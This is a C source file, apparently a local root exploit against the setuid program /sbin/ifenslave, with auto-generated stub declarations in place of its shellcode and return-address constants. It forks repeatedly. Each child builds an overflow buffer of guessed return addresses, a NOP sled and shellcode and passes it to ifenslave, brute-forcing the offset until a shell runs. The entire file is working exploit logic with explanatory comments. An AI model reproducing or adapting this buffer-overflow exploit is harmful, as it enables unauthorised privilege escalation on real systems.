#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  pid_t ;

/* Variables and functions */
 char NOP ; 
 int RET ; 
 scalar_t__ WIFEXITED (int) ; 
 int /*<<< orphan*/  execl (char*,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fork () ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 char* shellcode ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  wait (int*) ; 

int main(int argc, char **argv)
{
	int x=0, status, i;
	int offset=20; // <- positive.
	char buffer[1000];
	long retaddr;
	pid_t pid;

	retaddr=RET+offset;
	printf("\n[+] 0dd ifenslave local root xpl ;D\n\n");
	printf("[~] Trying offset %d, addr 0x%x\n",x, retaddr);
	// 300 - maximum number, which can be added to RET.
	// I have taken a small one, for debug. In real cases it can be about 100 times larger
	while(x<=300)
	{
		//creating child process
		if((pid=fork())==0)
		{

		 /* Child */

			// childe generates new exploit buffer with new retaddr.
			for (i=0;i<200;i+=4) {
				*(long *)&buffer[i] = retaddr;
			}
			for (i=0;i<100;i++) {
				buffer[i+200] = NOP;
			}
			for (i=0;i<strlen(shellcode);i++) {
				buffer[i+300] = shellcode[i];
			}
			// executing ifenslave - trying to exploit bof
			execl("/sbin/ifenslave","/sbin/ifenslave",buffer,NULL); //

		/* END */

		}
		// while child tries to exploit vulnerability in ifenslave, parent waits while it ends.
		// And signal, which child will send after it ends, will be placed in status variable.
		wait(&status);
		// Displaying the received signal. Just for debugging.
		printf("[~] Received signal: #%i\n", status);
		// Checking. If signal is zero (0), then child was finished without erros, it means, that after
		// overflowing ifenslave has continued to work - shellcode was executed or you have got into cs :)
		// (though it's almost impossible), so we have no reason to continue bruteforcing.
		if(WIFEXITED(status) != 0 ) {
			printf("[+] Retaddr guessed: 0x%x\n[~] Exiting...\n", retaddr);
			exit(1);
		} else {
		// If signal isn't zero, than we have some errors (SIGSEGV, SIGILL)...
		// Adding offset to x and retaddr and repeating a loop: creating child process, which tries
		// to get shell with a new buffer, waiting for him, checking signal,...:)
			retaddr+=offset;
        		x+=offset;
			printf("[~] Trying offset %d, addr 0x%x\n",x, retaddr);
		}
	}
}